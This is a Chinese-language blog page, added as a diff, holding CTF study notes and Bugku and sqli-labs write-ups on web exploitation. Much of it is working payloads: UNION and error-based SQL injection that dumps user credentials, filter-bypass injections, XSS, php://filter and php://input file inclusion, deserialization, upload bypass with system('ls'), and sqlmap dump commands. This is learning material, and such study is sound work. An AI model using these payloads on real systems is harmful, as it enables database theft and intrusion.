@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="php与mysqlApache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     $cfg[&amp;#39;Servers&amp;#39;][$i][&amp;#39;password&amp;#39;] = &amp;#39;sqlpassword&amp;#39;           localhost/phpMyAdmin/index.php 进入php数据库管理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2018/07/08/ctf -bugku/index.html">
+<meta property="og:site_name" content="Jason&#39;s sky">
+<meta property="og:description" content="php与mysqlApache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     $cfg[&amp;#39;Servers&amp;#39;][$i][&amp;#39;password&amp;#39;] = &amp;#39;sqlpassword&amp;#39;           localhost/phpMyAdmin/index.php 进入php数据库管理">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/rfF48EG.png">
+<meta property="og:updated_time" content="2018-09-22T10:26:58.661Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="php与mysqlApache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     $cfg[&amp;#39;Servers&amp;#39;][$i][&amp;#39;password&amp;#39;] = &amp;#39;sqlpassword&amp;#39;           localhost/phpMyAdmin/index.php 进入php数据库管理">
+<meta name="twitter:image" content="https://i.imgur.com/rfF48EG.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/08/ctf -bugku/"/>
+
+
+
+
+
+  <title>sql注入 | Jason's sky</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jason's sky</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">everbodyup</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/08/ctf -bugku/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="王嘉熙">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jason's sky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-08T09:55:26+08:00">
+                2018-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/08/ctf -bugku/" class="leancloud_visitors" data-flag-title="sql注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,965
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="php与mysql"><a href="#php与mysql" class="headerlink" title="php与mysql"></a>php与mysql</h1><p>Apache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     <code>$cfg[&#39;Servers&#39;][$i][&#39;password&#39;] = &#39;sqlpassword&#39;</code>          </p>
+<p>localhost/phpMyAdmin/index.php 进入php数据库管理        </p>
+<h1 id="面向对象与面向过程"><a href="#面向对象与面向过程" class="headerlink" title="面向对象与面向过程"></a>面向对象与面向过程</h1><p>面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了。面向对象是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为。例如五子棋，面向过程的设计思路就是首先分析问题的步骤：1、开始游戏，2、黑子先走，3、绘制画面，4、判断输赢，5、轮到白子，6、绘制画面，7、判断输赢，8、返回步骤2，9、输出最后结果。把上面每个步骤用分别的函数来实现，问题就解决了。 而面向对象的设计则是从另外的思路来解决问题。整个五子棋可以分为：1、黑白双方，这两方的行为是一模一样的，2、棋盘系统，负责绘制画面，3、规则系统，负责判定诸如犯规、输赢等。第一类对象（玩家对象）负责接受用户输入，并告知第二类对象（棋盘对象）棋子布局的变化，棋盘对象接收到了棋子的变化就要负责在屏幕上面显示出这种变化，同时利用第三类对象（规则系统）来对棋局进行判定。</p>
+<hr>
+<h1 id="ox前言："><a href="#ox前言：" class="headerlink" title="ox前言："></a>ox前言：</h1><p>sqlitabs源码下载放在wamp/—/htdocs目录下</p>
+<h1 id="标注"><a href="#标注" class="headerlink" title="标注"></a>标注</h1><p>常用URL编码<br>%20 space<br>%22 “<br>%27 ‘<br>%23 #<br>%2f /<br>%23 .<br>%26 &amp;</p>
+<p>mysql函数:<br>concat()连接字符串<br>rand()返回大于0小于1的数<br>floor()返回&lt;=输入数的整数</p>
+<h1 id="sql知识"><a href="#sql知识" class="headerlink" title="sql知识"></a>sql知识</h1><p>元数据库-数据库列表-表列表-字段列表-表内容<br>information_schema是元数据库<br>1.查询所有数据库<br>select * from information_schema.schemata</p>
+<h1 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson-1"></a>lesson-1</h1><p>字符型 单引号闭合<br>?id=1’<br>爆字段：        </p>
+<pre><code>?id=1&#39; order by 3 %23 #是否超出范围                
+?id=1&#39; union select 1,2,3 %23 #不显示   
+?id=-1&#39; union select 1,2,3 %23 #左假右真  
+
+?id=-1&#39; union select table_name,column_name,data_type from information_shcema.tables where table_name=&#39;accounts&#39;  
+</code></pre><p>爆表名：   </p>
+<pre><code>?id=&#39;-1&#39; union select 1,2,table_name from     information_schema.tables where table_schema = 0x7365637572697479 limit0,1 %23                   
+</code></pre><p>爆列名：    </p>
+<pre><code>?id=-1&#39; union select 1,2,column_name from information_schema.tables where table_schema = 0x7365637572697479 limit 0,1 %23     
+</code></pre><p>爆字段：</p>
+<pre><code> ?id=-1&#39; union select 1,2,column_name from information_schema.columns where table_name= 0x666c3467#    
+</code></pre><p>查看用户名和密码：                   </p>
+<pre><code>?id=-1&#39; union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1 %23                
+</code></pre><p>注：看源码my_fetch_array只取一行作为关联数组或数字数组，故需用limit0,1不断测试。0是索引，1是行数。  </p>
+<p>记payload</p>
+<p>limit后面跟：<br>–+  一些情况下浏览器把+编码成空格<br>– k </p>
+<h1 id="lesson2"><a href="#lesson2" class="headerlink" title="lesson2"></a>lesson2</h1><p>get整型注入：</p>
+<pre><code>?id=-1 union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 1,1 %23
+</code></pre><h1 id="lesson3"><a href="#lesson3" class="headerlink" title="lesson3"></a>lesson3</h1><p>单引号符号变形:<br>    id=-1’) or 1=1%23<br>爆：</p>
+<pre><code>?id=-1&#39;)  union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 1,1 %23
+</code></pre><h1 id="lesson4"><a href="#lesson4" class="headerlink" title="lesson4"></a>lesson4</h1><p>双引号闭合：<br>    ?id =1”) or 1=1 %23</p>
+<h1 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h1><p>双注入查询</p>
+<pre><code>?id=1&#39; union select count(*),1, concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;
+</code></pre><p>同理查询把version()换成database(),user(),datadir();</p>
+<p>参考这两个函数注入：<br>    EXTRACTVALUE (XML_document, XPath_string);<br>    UPDATEXML (XML_document, XPath_string, new_value);    </p>
+<pre><code>?id=1&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e) %23
+
+?id=1&#39; or (updatexml(1,concat(0x7e,(select user()),0x7e),1) %23
+</code></pre><h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>双注入双引号<br>payload:<br>    ?id=1” or 1=1%23</p>
+<h1 id="lesson7"><a href="#lesson7" class="headerlink" title="lesson7"></a>lesson7</h1><h1 id="sql注入常见问题"><a href="#sql注入常见问题" class="headerlink" title="sql注入常见问题"></a>sql注入常见问题</h1><p>查询列:’order by 5–+ 加号为空格,–是sql语法注释，排除后面多余引号影响。</p>
+<p>查询用户：’union select user(),version() –+</p>
+<p>查询数据库所在位置’union select user(),@@datadir–+</p>
+<p>CONCAT_WS(CHAR(32,58,32))表示用 空格对应ASCII码值32，冒号对应58，所以32,58,32表示空格冒号空格，这句话的意思是使用空格冒号空格对查询的字段进行分割</p>
+<p>查询库所有的表<br>‘union select table_name,table_schema from information_schema.tables–+</p>
+<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>修改hosts文件：在DNS查询之前，本机会先在hosts文件中查找，确认URL-IP键值对是否已存在于表中</p>
+<h1 id="flag在index中"><a href="#flag在index中" class="headerlink" title="flag在index中"></a>flag在index中</h1><p>过滤器php://filter作为中间流处理其他流<br>有resource,read,write</p>
+<p>关键信息：convert.base64-encode和 convert.base64-decode和base64_encode()，base64_decode()函数处理所有流数据</p>
+<p>payload:?file=php://filter/read/convert.base64-encode/resource=index.php</p>
+<h1 id="php黑魔法"><a href="#php黑魔法" class="headerlink" title="php黑魔法"></a>php黑魔法</h1><p>0e\d+转化为科学计数法<br>md5比较</p>
+<pre><code>&lt;?php $a = md5(&#39;240610708&#39;); // = 0e462097431906509019562988736854 $b = md5(&#39;QNKCDZO&#39;); // = 0e830400451993494058024219903391 var_dump($a == $b); ?&gt;
+
+var_dump(md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;));
+var_dump(md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;));
+var_dump(sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;));
+var_dump(sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;));
+</code></pre><p>一个数值和一个字符串比较，那么会将字符串转换为数值</p>
+<p>5.3之前：strcmp经典漏洞<br>传入非字符串类型的数据的时候，显示了报错的警告信息后，将return 0。</p>
+<h2 id="Refer作用"><a href="#Refer作用" class="headerlink" title="Refer作用"></a>Refer作用</h2><p>HTTP请求header一部分，表示一个网址或链接访问的来源。</p>
+<h1 id="备份文件是个好习惯"><a href="#备份文件是个好习惯" class="headerlink" title="备份文件是个好习惯"></a>备份文件是个好习惯</h1><p>备份文件后缀加  <em>.swp,</em>.bak<br>120.24.86.145:8002/web16/index.php默认访问index.php,打开index.php.bak</p>
+<h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><p>每次刷新会更换值，必须在2s以内完成</p>
+<p>跑脚本<br>    import requests<br>    import re<br>    url = ‘<a href="http://120.24.86.145:8002/qiumingshan/&#39;" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/&#39;</a><br>    s = requests.Session()<br>    source = s.get(url)<br>    expression = re.search(r’(\d+[+-*])+(\d+)’, source.text).group()<br>    result = eval(expression)<br>    post = {‘value’: result}<br>    print(s.post(url, data = post).text)</p>
+<p>绘画对下个请求，引入正则匹配search，group()返回表达式字符串,<br>用Python内建方法eval()计算结果,打印post后的值得到flag</p>
+<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>弹窗id=<srcipt>altert(123)<br>xml标记<br>&lt; &lt;<br>&gt; &lt;<br>&amp; &amp;<br>&apos; ‘   </srcipt></p>
+<p>Unicode编码构造绕过<br>u003c和u003e代替&lt;&gt;   </p>
+<pre><code>?id=\u003cimg src=1 onerror=alert(_key_)\u003e
+</code></pre><h1 id="never-giver-up"><a href="#never-giver-up" class="headerlink" title="never giver up"></a>never giver up</h1><p>查看源码发现密文，先进行URLdecode在进行Base64解码在进行URLdecode出现源代码，访问目录f412a3g.txt<br><img src="https://i.imgur.com/rfF48EG.png" alt=""></p>
+<p>#Cookies欺骗<br>base64编码<br>a2V5cy50eHQ为keys.txt<br>构造index.php加密filename=aW5kZXgucGhw访问<br>line=1,2,3遍历<br>写脚本</p>
+<pre><code>import requests
+
+for i in range (100):
+    url = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot;
+    s=requests.get(url)
+    print (s.text)
+</code></pre><p>得出源码<br>分析构造<code>filename=a2V5cy5waHA(keys.php)</code><br>Cookie: margin=margin拿flag</p>
+<h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><p>s=phpinfo()发现可以访问<br>利用s=print_r(glob(“<em>.</em>“))扫描出文件f94lag.txt<br>访问f94lag.txt得到flag</p>
+<h1 id="字符？正则"><a href="#字符？正则" class="headerlink" title="字符？正则"></a>字符？正则</h1><p><code>trim(）</code>函数移除字符串两侧字符<br><code>[:punct:]</code>匹配任何标点符号<br>对应正则匹配’?id=keyaakeyaaaakey:/a/aakeya./i’拿到flag</p>
+<h1 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h1><p>SQL约束攻击  ，SQL会限制字符串的最大长度，自动用空格补齐。<br>要查询’vampire’的信息，插入’vampire                  1’，执行查询条件会返回注册信息。</p>
+<p>限制条件：mysql处于ANSI模式，服务端没有对用户名长度限制，验证条件用户名和密码一起验证，</p>
+<p>payload:注册 admin+三空格，进行登陆查询</p>
+<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>Refer报文头指明当前流量的来源参考页，修改<code>Refer: https://www.google.com</code>拿到flag</p>
+<h1 id="md5-collection"><a href="#md5-collection" class="headerlink" title="md5 collection"></a>md5 collection</h1><p>php在处理哈希字符串时，凡是以0e开头的皆以0处理，值相等</p>
+<p>利用md5碰撞给a赋值得到flag</p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP;</p>
+<p>添加XFF头通过本地访问<code>X-Forwarded-For: 127.0.0.1</code></p>
+<h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><p>ha1() md5()函数漏洞都可通过构造数组绕过<br>无法处理数组类型将返回false</p>
+<p>构造<code>?id=margin&amp;uname[]=1</code><br>post data: <code>passwd[]=2</code></p>
+<p>uname!=passwd但是sha1(uname)=sha1(passwd)</p>
+<h1 id="PHP函数学习"><a href="#PHP函数学习" class="headerlink" title="PHP函数学习"></a>PHP函数学习</h1><p>trim()移除字符串两侧空白字符和预定义字符<br>file_get_contents()把整个文件读入一个字符串中<br>php:input访问请求的原始数据的只读流， POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA。</p>
+<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>根据提示尝试<code>http://120.24.86.145:8002/web8/flag.txt有flags</code><br>根据代码构造ac=fn,<code>http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</code>出现flag</p>
+<h1 id="考细心"><a href="#考细心" class="headerlink" title="考细心"></a>考细心</h1><p>404说明查找文件，robots.txt是搜索引擎中访问网站时候要查看的第一个文件，故构造<code>http://120.24.86.145:8002/web13/robots.txt</code>,根据代码构造<code>http://120.24.86.145:8002/web13/resusl.php</code>，根据if ($_GET[x]==$password)和提示尝试?x=admin得到flag</p>
+<h1 id="得到getshall"><a href="#得到getshall" class="headerlink" title="得到getshall"></a>得到getshall</h1><h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><p>var_dump()输出变量相关信息<br>eval()字符串按照PHP代码计算<br>$_request获取参数数据，post和get方法得到的数据均可通过它获得<br>include()函数和php://input; php://filter结合，可用php://filter读取文件源代码，PHP中独有的协议。</p>
+<pre><code>php://filter/convert.base64-encode/resource=index.php(文件路径)
+</code></pre><p>构造<br><code>hello=file(&quot;flag.php&quot;)</code>或者构造闭合<br><code>hello=1);print_r(file(&quot;flag.php&quot;)</code>就为<br><code>eval( &quot;var_dump(1);print_r(file(&quot;flag.php&quot;));&quot;);</code></p>
+<h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>index.php测试是否为PHP网页，用御剑扫描工具扫描后台，发现shell.php，登录需要admin，burp暴力破解，用简单密码扫描。密码为hack登录得到flag.</p>
+<h1 id="Welcome-to-BugkuCTF"><a href="#Welcome-to-BugkuCTF" class="headerlink" title="Welcome to BugkuCTF"></a>Welcome to BugkuCTF</h1><p>file_get_contents()把文件读入一个字符串</p>
+<h1 id="成绩单查询"><a href="#成绩单查询" class="headerlink" title="成绩单查询"></a>成绩单查询</h1><p>concat_ws(),多个字符串连接成一个字符串，一次性指定分隔符<br>concat_ws(separator,str1,str2…)<br>group_concat将group by产生的同一个分组中的值连接起来，返回一个字符串结果.</p>
+<p>查询数据库信息：</p>
+<pre><code>id=-1 union select 1,2,group_concat(schema_name) from information_schema.SCHEMATA#
+</code></pre><p>查询表名：</p>
+<pre><code>id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+</code></pre><p>查询列名：</p>
+<pre><code>id=-1 union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;thiskey&#39;
+</code></pre><p>过程<br>先遍历1,2,3有回显，有4列，<br>爆数据库</p>
+<pre><code>id=-1&#39; union select 1,2,3,database()#
+</code></pre><p>爆表名</p>
+<pre><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
+</code></pre><p>爆字段</p>
+<pre><code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#
+</code></pre><p>查询</p>
+<pre><code>id=-1&#39; union select 1,2,3,skctf_flag from fl4g#
+</code></pre><h1 id="我感觉你得快点"><a href="#我感觉你得快点" class="headerlink" title="我感觉你得快点"></a>我感觉你得快点</h1><pre><code>import requests
+from base64 import b64decode
+url=&#39;http://120.24.86.145:8002/web6/&#39;
+s=requests.Session()
+res=s.get(url).headers[&#39;flag&#39;]
+flag1=b64decode(res)
+flag2=str(flag1,encoding=&quot;utf-8&quot;)
+key=b64decode(flag2.split(&#39;: &#39;)[1])
+payload={&#39;margin&#39;:key}
+print(s.post(url,data=payload).text)
+</code></pre><p>首先Burp抓包，响应中有base64加密的flag密文，进行两次解码，得到数字，进行POST发现flag变化，根据提示快点，写脚本进行两次base64解码，两次发送应该用同一个回话。跑代码得到KEY</p>
+<h1 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h1><p>multipart/form-data基础方法为post，不同之处为请求头和请求体，头包括Content-Type，值规定为multipart/form-data,请求体加了分隔符等内容，</p>
+<p>修改字母大小写<code>Content-Type:Multipart/form-data</code><br>后缀名黑名单检测和类型检测;<br>修改文件后缀名：<code>.php5</code>绕过</p>
+<h1 id="Insert-Into注入"><a href="#Insert-Into注入" class="headerlink" title="Insert Into注入"></a>Insert Into注入</h1><p>学习sqlmap使用<br>Post登录框注入<br>sqlmap.py -r 文件读取数据 -p 制定参数 –tables<br>sqlmap.py -u 登录地址 –forms 自动判断注入<br>sqlmap.py -u 登录地址 –data “指定参数”</p>
+<p>-u #注入点<br>-g 谷歌搜索<br>-b 获取数据库版本信息<br>-p 指定可测试参数<br>-D 指定数据库名<br>-T 指定表名<br>-C 指定字段(column)<br>-dump 获取字段</p>
+<p>首先爆库<br><code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs</code><br>爆表<br><code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables</code><br>爆字段<br><code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugku1 -T flag1 -p admin_name --columns</code><br>爆数据<br><code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</code></p>
+<h1 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h1><p>%20 sqace<br>%23 #编码<br>%27 ‘编码</p>
+<p>union select and or被过滤<br>limit from未过滤</p>
+<p>数据库web1002-1<br><code>http://120.24.86.145:9004/1ndex.php?id=-1&#39;uniunionon selselectect 1,database()%23</code><br>爆表flag1<br><code>http://120.24.86.145:9004/1ndex.php?id=-1&#39;ununionion seselectlect 1,(seselectlect table_name from infoorrmation_schema.tables where table_schema=database() limit 0,1)%23</code><br>爆字段<br>flag1<br><code>http://120.24.86.145:9004/1ndex.php?id=-1&#39;ununionion seselectlect 1,(seselectlect column_name from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;flag1&#39; limit 0,1)%23</code><br>address<br><code>http://120.24.86.145:9004/1ndex.php?id=-1&#39;ununionion seselectlect 1,(seselectlect column_name from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;flag1&#39; limit 1,1)%23</code><br>查询字段<br><code>http://120.24.86.145:9004/1ndex.php?id=-1&#39;ununionion seselectlect 1,(seselectlect address from flag1)%23</code><br>进入下一关<br><code>id=1&#39; union%23</code>出现过滤<br>同理select sleep substr被过滤<br>后续不会—-</p>
+<h1 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h1><p>关于渗透测试<br>御剑扫描发现后台<a href="http://wp.bugku.com/phpmyadmin/" target="_blank" rel="noopener">http://wp.bugku.com/phpmyadmin/</a><br>用wp登陆发现Flag</p>
+<h1 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h1><p>unserialize()反序列化数据<br>serialize()序列化数据</p>
+<p>根据提示赋值hint=1得到源码，<br>分析代码可得出，KEY的值在后面为赋值，序列化的值应为NULL，<br><code>unserialize($cookie) === &quot;$KEY&quot;</code>可得出<br>用Burp抓包给COOKIE赋值<code>Cookie: ISecer=s:0:&quot;&quot;;</code>得到Flag</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>system($command)函数执行commdand参数指定的命令，输出执行结果</p>
+<p>php://filter处理<br><code>http://118.89.219.210:49166/index.php?file=hello.php/php://filter/read=convert.base64-encode/resource=hello.php</code><br>发现upload.php</p>
+<p>修改<code>http://118.89.219.210:49166/index.php?file=upload.php</code>，<br>在PHP写入<code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code>列出当前目录，修改后缀名1.php;.jpg绕过检测</p>
+<p>上传成功看到flag文件</p>
+<p>包含或访问拿到FLAG</p>
+<h1 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h1><p>扫描后台得到show.php，访问之后发现flag</p>
+<h1 id="welcome-to-the-bugkuctf"><a href="#welcome-to-the-bugkuctf" class="headerlink" title="welcome to the bugkuctf"></a>welcome to the bugkuctf</h1><p>php://input 处理原始数据流，将参数传进,post值为文件内容</p>
+<p>分析代码，<br>user存在且不为空，<br>user文件内容为welcome to the bugkuctf<br>file为hint.php,导入</p>
+<p><code>http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=</code></p>
+<p>post:welcome to the bugkuctf</p>
+<p>得到base64加密的字符串<br>同理查看index.php源码</p>
+<p>1.hint.php提示flag.php<br>2.hint.php定义类Flag,_tostring类作为字符串自动执行<br>3.函数执行输出$file文件内容，<br>4、index.php看到$password反序列化作用</p>
+<p>写PHP文件构造$PASSWORD</p>
+<pre><code>&lt;?php
+    class Flag{//flag.php  
+    public $file;  
+    }  
+
+    $a = new Flag();
+    $a-&gt;file = &quot;flag.php&quot;;
+    $a = serialize($a);
+    print_r($a);
+?&gt;
+</code></pre><p>得到<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
+<p>传参<br><code>http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file==hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>post: welcome to the bugkuctf</p>
+<hr>
+<p>墨者学院ctf学习</p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>数据库information_schema、表SCHEMATA、列SCHEMA_NAME</p>
+<p>information_schema元数据库<br>schemata提供数据库信息<br>tables 表</p>
+<p>columns 字段信息</p>
+<ul>
+<li>schema_name 数据库名</li>
+<li>table_name 表名</li>
+<li>column_name 字段名</li>
+<li>column_type 字段类型</li>
+</ul>
+<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</p>
+<p>将相同行组合起来</p>
